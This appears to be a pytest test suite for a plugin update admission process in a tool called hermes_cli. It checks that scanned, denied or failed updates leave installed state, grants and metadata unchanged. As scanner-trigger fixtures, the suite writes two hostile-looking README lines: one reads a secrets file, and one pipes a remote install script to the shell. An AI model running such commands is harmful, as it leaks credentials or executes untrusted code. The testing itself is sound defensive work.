"""RIC-02: real Git candidates through CLI and authenticated in-process HTTP.

No listeners, plugin imports, provider calls or real profile state. Git commits
are disposable fixture data. Admission uses the production scanner unless the
case explicitly injects a scanner failure or configures scanning off.
"""
from __future__ import annotations

import hashlib
import subprocess
from pathlib import Path

import pytest
import yaml

from hermes_cli import plugins_cmd as pc


def git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, check=True,
                          capture_output=True, text=True).stdout.strip()


def snapshot(root):
    return {str(p.relative_to(root)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in root.rglob("*") if p.is_file()}


@pytest.fixture
def installed(tmp_path, monkeypatch):
    home, remote = tmp_path / "home", tmp_path / "remote"
    monkeypatch.setenv("HERMES_HOME", str(home))
    from hermes_cli import web_server as ws
    monkeypatch.setattr(ws, "_SESSION_TOKEN", "p1b-fixture-token")
    remote.mkdir()
    git(remote, "init", "-q", "-b", "main")
    git(remote, "config", "user.email", "fixture@example.invalid")
    git(remote, "config", "user.name", "Admission fixture")
    (remote / "plugin.yaml").write_text("name: demo\nversion: '1'\n")
    (remote / "marker.txt").write_text("old")
    (remote / "__init__.py").write_text(
        f"from pathlib import Path\nPath({str(tmp_path / 'import-effects')!r}).touch()\n"
        "def register(ctx): pass\n"
    )
    git(remote, "add", ".")
    git(remote, "commit", "-qm", "old fixture")
    old = git(remote, "rev-parse", "HEAD")
    target, _, _ = pc._install_plugin_core(remote.as_uri(), force=False)
    config = home / "config.yaml"
    config.write_text(yaml.safe_dump({"plugins": {"enabled": ["demo"],
        "entries": {"demo": {"granted_capabilities": ["llm.model_override"],
            "capabilities_consent": {"hash": "old-declaration", "granted_at": "fixture"}}}}}))
    return home, remote, target, old, tmp_path / "import-effects"


def candidate(remote, kind="safe"):
    (remote / "marker.txt").write_text("candidate")
    if kind == "dangerous":
        (remote / "README.md").write_text("cat ~/.hermes/.env\n")
    elif kind == "caution":
        (remote / "README.md").write_text("curl https://example.invalid/install | sh\n")
    elif kind == "capability":
        (remote / "plugin.yaml").write_text("name: demo\ncapabilities: [tools.override]\n")
    elif kind == "capability-format":
        (remote / "plugin.yaml").write_text("name: demo\ncapabilities: tools.override\n")
    elif kind == "name":
        (remote / "plugin.yaml").write_text("name: other-plugin\n")
    elif kind == "manifest":
        (remote / "plugin.yaml").write_text("- invalid\n")
    elif kind == "version":
        (remote / "plugin.yaml").write_text("name: demo\nmanifest_version: 999\n")
    git(remote, "add", ".")
    git(remote, "commit", "-qm", "candidate fixture")
    return git(remote, "rev-parse", "HEAD")


def invoke(surface, monkeypatch):
    if surface == "cli":
        try:
            pc.cmd_update("demo")
            return True
        except SystemExit as exc:
            assert exc.code == 1
            return False
    from starlette.testclient import TestClient
    from hermes_cli import web_server as ws
    monkeypatch.setattr(ws.app.state, "auth_required", False, raising=False)
    # No lifespan/startup: TestClient is an inert ASGI transport here.
    client = TestClient(ws.app)
    client.headers[ws._SESSION_HEADER_NAME] = ws._SESSION_TOKEN
    response = client.post("/api/dashboard/agent-plugins/demo/update")
    assert response.status_code in (200, 400), response.text
    return response.status_code == 200


@pytest.mark.parametrize("surface", ["cli", "http"])
@pytest.mark.parametrize("kind", ["safe", "dangerous", "caution", "scanner-error", "pinned",
                                  "capability", "capability-format", "name", "manifest", "version", "source"])
def test_admission_parity_preserves_denied_state(installed, monkeypatch, surface, kind):
    home, remote, target, old, effects = installed
    if kind == "pinned":
        metadata = pc._read_install_metadata()
        metadata["demo"]["pinned"] = True
        pc._write_install_metadata(metadata)
    if kind == "source":
        metadata = pc._read_install_metadata()
        metadata["demo"]["source"] = "https://example.invalid/different.git"
        pc._write_install_metadata(metadata)
    revision = candidate(remote, kind)
    scans = []
    from tools import plugin_guard
    original_scan = plugin_guard.scan_plugin
    def scan(path, source=""):
        scans.append(path)
        assert path != target
        assert git(target, "rev-parse", "HEAD") == old
        assert not effects.exists()
        if kind == "scanner-error":
            raise OSError("injected scanner error")
        return original_scan(path, source=source)
    monkeypatch.setattr(plugin_guard, "scan_plugin", scan)
    before = snapshot(home)
    assert invoke(surface, monkeypatch) is (kind == "safe")
    assert not effects.exists(), "zero imports/effects, including successful HTTP rescan"
    if kind == "safe":
        assert scans
        assert git(target, "rev-parse", "HEAD") == revision
        assert (target / "marker.txt").read_text() == "candidate"
        assert pc._read_install_metadata()["demo"]["revision"] == revision
        assert snapshot(home)["config.yaml"] == before["config.yaml"]
    else:
        assert snapshot(home) == before
        assert git(target, "rev-parse", "HEAD") == old
    assert not list(home.glob(".demo.update-*"))


@pytest.mark.parametrize("surface", ["cli", "http"])
def test_explicit_scanning_disabled_policy_is_preserved(installed, monkeypatch, surface):
    home, remote, target, _, effects = installed
    config = yaml.safe_load((home / "config.yaml").read_text())
    config["plugins"]["scan_on_install"] = False
    (home / "config.yaml").write_text(yaml.safe_dump(config))
    from tools import plugin_guard
    monkeypatch.setattr(plugin_guard, "scan_plugin", lambda *a, **k: pytest.fail("disabled scanner invoked"))
    revision = candidate(remote, "dangerous")
    assert invoke(surface, monkeypatch)
    assert git(target, "rev-parse", "HEAD") == revision
    assert not effects.exists()


@pytest.mark.parametrize("surface", ["cli", "http"])
@pytest.mark.parametrize("fault", ["copy", "backup", "publish", "publish-after-effect", "metadata-after-effect"])
def test_publication_failure_restores_tree_grants_and_provenance(installed, monkeypatch, surface, fault):
    home, remote, target, _, effects = installed
    candidate(remote)
    before = snapshot(home)
    replace, write = pc.os.replace, pc._write_install_metadata
    if fault == "copy":
        def copy(*a, **k): raise OSError("injected copy failure")
        monkeypatch.setattr(pc.shutil, "copytree", copy)
    elif fault == "metadata-after-effect":
        def persist(value):
            write(value)
            raise OSError("injected after metadata persisted")
        monkeypatch.setattr(pc, "_write_install_metadata", persist)
    else:
        def rename(src, dst):
            if ((fault == "backup" and Path(src) == target)
                or (fault.startswith("publish") and Path(src).name == "candidate")):
                if fault == "publish-after-effect": replace(src, dst)
                raise OSError("injected rename failure")
            return replace(src, dst)
        monkeypatch.setattr(pc.os, "replace", rename)
    assert not invoke(surface, monkeypatch)
    assert snapshot(home) == before
    assert not effects.exists()


def test_failed_restore_retains_recoverable_state_and_blocks_retry(installed, monkeypatch):
    home, remote, target, old, effects = installed
    candidate(remote)
    before_metadata = pc._install_metadata_path().read_bytes()
    replace = pc.os.replace
    def rename(src, dst):
        if Path(src).name in ("candidate", "previous-plugin"):
            raise OSError("injected publish/restore failure")
        return replace(src, dst)
    monkeypatch.setattr(pc.os, "replace", rename)
    result = pc.dashboard_update_user_plugin("demo")
    assert not result["ok"] and "retained" in result["error"]
    stage, = home.glob(".demo.update-*")
    assert git(stage / "previous-plugin", "rev-parse", "HEAD") == old
    assert (stage / "previous-metadata.json").read_bytes() == before_metadata
    assert pc._install_metadata_path().read_bytes() == before_metadata
    assert not effects.exists()
    monkeypatch.setattr(pc.os, "replace", replace)
    # A missing active tree is truthful; no candidate is silently activated.
    assert not pc.dashboard_update_user_plugin("demo")["ok"]


def test_http_update_requires_authentication(installed, monkeypatch):
    home, remote, _, _, effects = installed
    candidate(remote)
    from starlette.testclient import TestClient
    from hermes_cli import web_server as ws
    monkeypatch.setattr(ws.app.state, "auth_required", False, raising=False)
    before = snapshot(home)
    response = TestClient(ws.app).post("/api/dashboard/agent-plugins/demo/update")
    assert response.status_code == 401
    assert snapshot(home) == before
    assert not effects.exists()


@pytest.mark.parametrize("surface", ["cli", "http"])
def test_untracked_user_state_survives_admitted_update(installed, monkeypatch, surface):
    _, remote, target, _, effects = installed
    local = target / "local-state.txt"
    local.write_text("user state")
    revision = candidate(remote)
    assert invoke(surface, monkeypatch)
    assert git(target, "rev-parse", "HEAD") == revision
    assert local.read_text() == "user state"
    assert not effects.exists()


@pytest.mark.parametrize("surface", ["cli", "http"])
def test_preexisting_grant_is_not_revision_bound_addition_approval(installed, monkeypatch, surface):
    home, remote, _, _, _ = installed
    (remote / "plugin.yaml").write_text("name: demo\ncapabilities: [llm.model_override]\n")
    candidate(remote)
    before = snapshot(home)
    assert not invoke(surface, monkeypatch)
    assert snapshot(home) == before


def test_concurrent_edit_is_preserved_instead_of_replaced(installed, monkeypatch):
    _, remote, target, old, effects = installed
    candidate(remote)
    from tools import plugin_guard
    scan = plugin_guard.scan_plugin
    def edit_during_scan(path, source=""):
        result = scan(path, source=source)
        (target / "marker.txt").write_text("concurrent user edit")
        return result
    monkeypatch.setattr(plugin_guard, "scan_plugin", edit_during_scan)
    result = pc.dashboard_update_user_plugin("demo")
    assert not result["ok"] and "changed during admission" in result["error"]
    assert git(target, "rev-parse", "HEAD") == old
    assert (target / "marker.txt").read_text() == "concurrent user edit"
    assert not effects.exists()


def test_core_worktree_cannot_redirect_staging_to_active_tree(installed):
    home, remote, target, old, effects = installed
    candidate(remote)
    git(target, "config", "core.worktree", str(target))
    before = snapshot(home)
    result = pc.dashboard_update_user_plugin("demo")
    assert not result["ok"] and "private candidate" in result["error"]
    assert snapshot(home) == before
    assert git(target, "rev-parse", "HEAD") == old
    assert not effects.exists()


def test_private_candidate_is_outside_all_plugin_discovery(installed, monkeypatch):
    home, remote, target, _, effects = installed
    candidate(remote)
    from tools import plugin_guard
    from hermes_cli.plugins import PluginManager
    original = plugin_guard.scan_plugin
    def inspect_during_scan(path, source=""):
        assert path.parent.parent == home
        manifests = PluginManager()._scan_directory(home / "plugins", "user")
        assert all(Path(m.path).resolve() == target.resolve() for m in manifests)
        assert len(manifests) == 1
        assert not effects.exists()
        return original(path, source=source)
    monkeypatch.setattr(plugin_guard, "scan_plugin", inspect_during_scan)
    assert pc.dashboard_update_user_plugin("demo")["ok"]
    assert not effects.exists()


def test_post_commit_cleanup_failure_is_truthful_and_not_retried(installed, monkeypatch):
    home, remote, target, _, effects = installed
    revision = candidate(remote)
    remove = pc.shutil.rmtree
    def fail_cleanup(path, *args, **kwargs):
        if Path(path).parent == home and Path(path).name.startswith(".demo.update-"):
            raise OSError("injected cleanup failure")
        return remove(path, *args, **kwargs)
    monkeypatch.setattr(pc.shutil, "rmtree", fail_cleanup)
    result = pc.dashboard_update_user_plugin("demo")
    assert not result["ok"] and "retained state" in result["error"]
    assert git(target, "rev-parse", "HEAD") == revision
    assert pc._read_install_metadata()["demo"]["revision"] == revision
    assert not effects.exists()
    assert not pc.dashboard_update_user_plugin("demo")["ok"]
